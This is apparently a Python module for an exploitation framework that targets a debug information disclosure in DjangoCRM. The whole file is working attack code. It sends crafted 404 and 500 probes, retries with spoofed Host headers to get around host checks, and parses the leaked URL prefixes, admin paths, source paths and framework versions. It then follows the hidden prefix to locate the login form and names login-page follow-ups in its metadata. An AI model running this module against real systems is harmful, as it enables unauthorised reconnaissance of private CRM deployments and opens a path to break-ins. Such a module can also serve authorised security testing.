#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-71238 — DjangoCRM unauthenticated debug information disclosure."""

import re
from html import unescape

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "DjangoCRM Debug Info Disclosure (CVE-2026-71238)",
        "description": (
            "CVE-2026-71238 in DjangoCRM 0.91 through 2.4.0: shipped webcrm/settings.py keeps "
            "DEBUG=True and uses secret URL prefixes as the only access gate. An unauthenticated "
            "bogus i18n 404 dumps the live URLconf, and /voip/get-callback/ returns a full "
            "technical_500 debug page with source paths and framework versions."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-71238"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-71238",
            "https://www.cve.org/CVERecord?id=CVE-2026-71238",
        ],
        "tags": [
            "django",
            "django-crm",
            "debug",
            "info-disclosure",
            "crm",
            "unauthenticated",
            "cve-2026-71238",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["django", "python"],
                "confidence_min_any": {"django": 0.2},
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "info_disclosure", "from_detail": "URLconf prefix leak"},
                    {"capability": "admin_surface", "from_detail": "CRM login surface"},
                ],
                "suggested_followups": [
                    "auxiliary/scanner/http/login_page_detector",
                ],
            },
        },
    }

    port = OptPort(8000, "DjangoCRM HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    lang_prefix = OptString("en", "i18n language prefix for the bogus 404 probe", False)
    probe_suffix = OptString(
        "alim-nonexistent-zzz",
        "Final path segment for the bogus 404 probe",
        False,
        advanced=True,
    )
    probe_500_path = OptString(
        "/voip/get-callback/",
        "Path that triggers the unauthenticated TypeError / 500 debug page",
        False,
        advanced=True,
    )
    follow_login = OptBool(
        True,
        "Follow the recovered CRM prefix to locate the CSRF login form",
        False,
    )
    probe_500 = OptBool(
        True,
        "Also trigger /voip/get-callback/ for the technical_500 debug page",
        False,
    )

    def _parse_prefixes(self, body: str):
        if "Django tried these URL patterns" not in (body or ""):
            return None, None, []
        text = unescape(body or "")
        pairs = re.findall(
            r"<code>\s*([A-Za-z]{2}(?:-[A-Za-z]{2})?/)\s*</code>\s*"
            r"<code>\s*([^<\s][^<]*?)\s*</code>",
            text,
        )
        counts = {}
        order = []
        for _lang, nested in pairs:
            nested = nested.strip()
            if not nested:
                continue
            if nested not in counts:
                counts[nested] = 0
                order.append(nested)
            counts[nested] += 1
        if not order:
            return None, None, []
        ranked = sorted(order, key=lambda p: (-counts[p], order.index(p)))
        return ranked[0], ranked[1] if len(ranked) > 1 else None, order

    def _parse_500(self, body: str):
        fields = {}
        for key in (
            "Exception Type",
            "Exception Value",
            "Exception Location",
            "Django Version",
            "Python Version",
        ):
            match = re.search(
                r"<th[^>]*>%s:</th>\s*<td>(.*?)</td>" % re.escape(key),
                body or "",
                re.S,
            )
            if match:
                fields[key] = unescape(re.sub(r"<[^>]+>", "", match.group(1))).strip()
        frame_files = re.findall(r'<code class="fname">([^<]+)</code>', body or "")
        return fields, frame_files

    def check(self):
        base = (self.path or "/").rstrip("/")
        path = f"{base}/{self.lang_prefix}/{self.probe_suffix.lstrip('/')}"
        try:
            response = self.http_request(method="GET", path=path, allow_redirects=False, timeout=int(self.timeout or 15))
            if response and response.status_code == 400:
                for host in ("localhost", "127.0.0.1"):
                    response = self.http_request(
                        method="GET",
                        path=path,
                        allow_redirects=False,
                        timeout=int(self.timeout or 15),
                        headers={"Host": host},
                    )
                    if response and response.status_code != 400:
                        break
        except Exception as exc:
            return {
                "vulnerable": False,
                "reason": f"target unreachable: {exc.__class__.__name__}",
                "confidence": "low",
            }

        if not response:
            return {"vulnerable": False, "reason": "no HTTP response", "confidence": "low"}
        if response.status_code == 400:
            return {
                "vulnerable": False,
                "reason": "HTTP 400 — ALLOWED_HOSTS rejected every Host we tried",
                "confidence": "medium",
            }

        body = response.text or ""
        if "Django tried these URL patterns" not in body:
            return {
                "vulnerable": False,
                "reason": (
                    f"HTTP {response.status_code} with no technical-404 URLconf listing "
                    "(DEBUG=False or not django-crm)"
                ),
                "confidence": "high",
            }

        crm, admin, all_prefixes = self._parse_prefixes(body)
        if not all_prefixes:
            return {
                "vulnerable": True,
                "reason": "Django debug 404 present but no nested prefixes parsed",
                "confidence": "medium",
                "crm_prefix": crm,
                "admin_prefix": admin,
                "prefixes": [],
                "body": body,
            }

        reason = f"URLconf leaked; CRM prefix '{crm}'"
        if admin:
            reason += f", admin prefix '{admin}'"
        return {
            "vulnerable": True,
            "reason": reason,
            "confidence": "high",
            "crm_prefix": crm,
            "admin_prefix": admin,
            "prefixes": all_prefixes,
            "body": body,
        }

    def run(self):
        try:
            print_status("CVE-2026-71238 — DjangoCRM debug information disclosure")

            result = self.check()
            if not result.get("vulnerable"):
                print_error(result.get("reason", "Target does not appear vulnerable"))
                return False

            print_success(result.get("reason", "Target appears vulnerable"))
            body = result.get("body") or ""
            crm = result.get("crm_prefix")
            admin = result.get("admin_prefix")
            all_prefixes = result.get("prefixes") or []
            base = (self.path or "/").rstrip("/")

            match = re.search(r"(Django tried these URL patterns.*?)</ol>", body, re.S)
            if match:
                listing = unescape(re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", match.group(1)))).strip()
                print_info(f"Leaked URLconf excerpt:\n{listing[:1200]}")
            if crm:
                print_info(f"Recovered CRM prefix   : {crm}")
            if admin:
                print_info(f"Recovered admin prefix : {admin}")
            if all_prefixes:
                print_info(f"All nested prefixes    : {', '.join(all_prefixes)}")

            login_url = None
            if crm and self.follow_login:
                login_path = f"{base}/{self.lang_prefix}/{crm.strip('/')}/"
                print_status(f"Following recovered CRM prefix {login_path}")
                try:
                    response = self.http_request(
                        method="GET",
                        path=login_path,
                        allow_redirects=True,
                        timeout=int(self.timeout or 15),
                    )
                    if response and response.status_code == 400:
                        for host in ("localhost", "127.0.0.1"):
                            response = self.http_request(
                                method="GET",
                                path=login_path,
                                allow_redirects=True,
                                timeout=int(self.timeout or 15),
                                headers={"Host": host},
                            )
                            if response and response.status_code != 400:
                                break
                    if response:
                        final_url = response.url or login_path
                        has_csrf = "csrfmiddlewaretoken" in (response.text or "")
                        print_status(
                            f"GET {login_path} -> {final_url} "
                            f"(HTTP {response.status_code}, csrf={'yes' if has_csrf else 'no'})"
                        )
                        if response.status_code == 200 and has_csrf:
                            login_url = final_url
                            print_success(f"Authentication surface located at {final_url}")
                except Exception as exc:
                    print_warning(f"Login-surface probe failed: {exc.__class__.__name__}")

            debug_fields = {}
            if self.probe_500:
                path_500 = f"{base}{self.probe_500_path}" if base else self.probe_500_path
                print_status(f"Triggering unauthenticated exception at {path_500}")
                try:
                    response = self.http_request(
                        method="GET",
                        path=path_500,
                        allow_redirects=False,
                        timeout=int(self.timeout or 15),
                    )
                    if response and response.status_code == 400:
                        for host in ("localhost", "127.0.0.1"):
                            response = self.http_request(
                                method="GET",
                                path=path_500,
                                allow_redirects=False,
                                timeout=int(self.timeout or 15),
                                headers={"Host": host},
                            )
                            if response and response.status_code != 400:
                                break
                    if response and response.status_code == 500 and "Exception Type:" in (response.text or ""):
                        debug_fields, frame_files = self._parse_500(response.text or "")
                        print_success("Technical 500 debug page received")
                        for key, value in debug_fields.items():
                            print_info(f"{key}: {value}")
                        app_frames = [f for f in frame_files if "site-packages" not in f]
                        if app_frames:
                            print_info("Application source frames:")
                            for frame in app_frames[:8]:
                                print_info(f"  {frame}")
                    elif response:
                        print_status(
                            f"{path_500} returned HTTP {response.status_code} (no 500 debug page)"
                        )
                except Exception as exc:
                    print_warning(f"500 probe failed: {exc.__class__.__name__}")

            evidence = []
            if all_prefixes:
                evidence.append("URLconf prefixes leaked (" + ", ".join(all_prefixes) + ")")
            if login_url:
                evidence.append(f"login surface located at {login_url}")
            if debug_fields.get("Exception Type"):
                evidence.append(
                    "500 debug page leaked %s / %s / %s"
                    % (
                        debug_fields.get("Exception Type", "?"),
                        debug_fields.get("Django Version", "?"),
                        debug_fields.get("Python Version", "?"),
                    )
                )
            print_success("; ".join(evidence) if evidence else "Unauthenticated debug disclosure confirmed")

            return True

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
